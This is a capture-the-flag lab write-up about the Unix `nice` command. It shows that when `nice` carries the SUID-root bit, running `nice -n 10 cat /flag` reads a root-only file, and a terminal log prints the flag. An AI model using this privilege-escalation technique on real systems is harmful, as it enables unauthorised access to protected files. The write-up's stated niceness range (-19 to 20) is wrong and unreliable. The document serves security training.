`nice`

	 is a command in Unix-based OS which is used to run a program with modified scheduling priority. It allows you to adjust the scheduling priority of a process when it's started, potentially making it run with a higher or lower priority compared to other processes.

Let's take an example. Suppose you are running a CPU intensive task, like compressing a large file using `gzip`, and you want to limit its impact on the other processing running on the system.

By default, `gzip` will run with the same priority as other processes, potentially consuming a significant amount of CPU resources. You can use `nice` to lower the priority of the `gzip` command, allowing it to use fewer CPU resources.

Suppose you have a large text file named `bigfile.txt` that you want to compress using `gzip`.

Running `gzip` without `nice`:

```
gzip bigfile.txt
```

This will compress the `bigfile.txt` using default priority.

Running `gzip` with `nice`:

```bash
nice -n 10 gzip bigfile.txt
```

> [!NOTE]
> `lowest priority is 20 and highest priority is -19 and default priority is 0`

This command starts the `gzip` with lower priority (`nice -n 10`). This compression process will still run, but it will consume fewer CPU resources compared to the default priority.

In our problem, the `nice` command has the `SUID` bit set, it means that it will run with the permissions of the `root` user. Therefore we can exploit this to read the content of the flag file `/flag`, which has restricted permissions(`-r--------`, only readable by the `root` user).

If we run the command `nice -n 10 cat /flag`, it will print the flag. This command runs the `nice` command with the `SUID` bit set, which then executes the `cat /flag`. Since `nice` is executed with elevated privileges, it should allow us to read the contents of the `flag` file, despite we don't have the necessary permissions for it.

```bash
hacker@program-misuse-level-27:~$ /challenge/babysuid_level27 
Welcome to /challenge/babysuid_level27!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/nice.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level27) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/nice!
hacker@program-misuse-level-27:~$ ls -l /usr/bin/nice
-rwsr-xr-x 1 root root 43352 Sep  5  2019 /usr/bin/nice
hacker@program-misuse-level-27:~$ nice /flag
nice: '/flag': Permission denied
hacker@program-misuse-level-27:~$ cat /flag
cat: /flag: Permission denied
hacker@program-misuse-level-27:~$ nice -n 19 cat /flag
pwn.college{E2CbqYM70xsbPK_CgHq0pCI5mTE.0VO2EDL0AjNzQzW}
hacker@program-misuse-level-27:~$ nice 
0
hacker@program-misuse-level-27:~$ nice -n 1 cat /flag
pwn.college{E2CbqYM70xsbPK_CgHq0pCI5mTE.0VO2EDL0AjNzQzW}
hacker@program-misuse-level-27:~$ nice -n -1 cat /flag
nice: cannot set niceness: Permission denied
pwn.college{E2CbqYM70xsbPK_CgHq0pCI5mTE.0VO2EDL0AjNzQzW}
hacker@program-misuse-level-27:~$ nice -n -20 cat /flag
nice: cannot set niceness: Permission denied
pwn.college{E2CbqYM70xsbPK_CgHq0pCI5mTE.0VO2EDL0AjNzQzW}
hacker@program-misuse-level-27:~$ ls -l /flag
-r-------- 1 root root 57 Jan  2 06:43 /flag
hacker@program-misuse-level-27:~$ cat /flag
cat: /flag: Permission denied
```

Here important to note that you can use any integer from `-19` to `20`. It doesn't matter here in this problem. We don't have to think about modifying the scheduling process. 

> [!question]
> But why when I put any negative integer in the `x` in the `nice -n x cat /flag` it says `nice: cannot set niceness: Permission denied` and don't show this message when I put positive integer. In both cases the flag is printed. Why is that?

